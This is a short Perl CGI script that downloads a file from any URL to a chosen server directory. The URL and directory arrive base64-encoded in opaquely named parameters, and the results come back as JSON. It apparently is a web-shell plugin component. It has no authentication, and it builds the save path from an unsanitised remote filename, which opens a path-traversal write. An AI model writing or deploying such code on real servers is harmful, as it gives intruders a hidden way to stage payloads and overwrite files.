use strict;
use warnings;
use CGI;
use MIME::Base64;
use JSON;
use LWP::UserAgent;
use File::Spec;
use URI;

sub main {
    my $q = CGI->new;
    my $z0 = $q->param('z0') // '';
    my $z1 = $q->param('z1') // '';

    my $url      = decode_base64($z0);
    my $save_dir = decode_base64($z1);

    my $json = JSON->new->utf8;

    my $ua = LWP::UserAgent->new;
    $ua->timeout(30);
    $ua->agent("Mozilla/5.0");

    my $response = $ua->head($url);
    
    unless ($response->is_success) {
        $response = $ua->get($url);
    }

    my $filename;

    my $content_disp = $response->header('Content-Disposition');
    if ($content_disp) {
        if ($content_disp =~ /filename="?([^";]+)"?/i) {
            $filename = $1;
        }
    }

    unless ($filename) {
        my $uri = URI->new($url);
        if ($uri) {
            my $path = $uri->path // '';
            $filename = (split(/\//, $path))[-1];
        }
    }

    if (!$filename || $filename eq '' || $filename eq '/') {
        $filename = 'download.bin';
    }

    $save_dir =~ s/[\\\/]+$//;
    my $file_path = $save_dir . '/' . $filename;

    my $download_res = $ua->get($url);

    if (!$download_res->is_success) {
        print $json->encode({
            success => JSON::false,
            error   => 'Download failed'
        });
        return;
    }

    my $data = $download_res->content;

    eval {
        open(my $fh, '>', $file_path) or die;
        binmode($fh);
        print $fh $data;
        close($fh);
        1;
    } or do {
        print $json->encode({
            success => JSON::false,
            error   => 'Failed to write file to disk'
        });
        return;
    };

    print $json->encode({
        success  => JSON::true,
        filename => $filename,
        path     => $file_path
    });
}

main();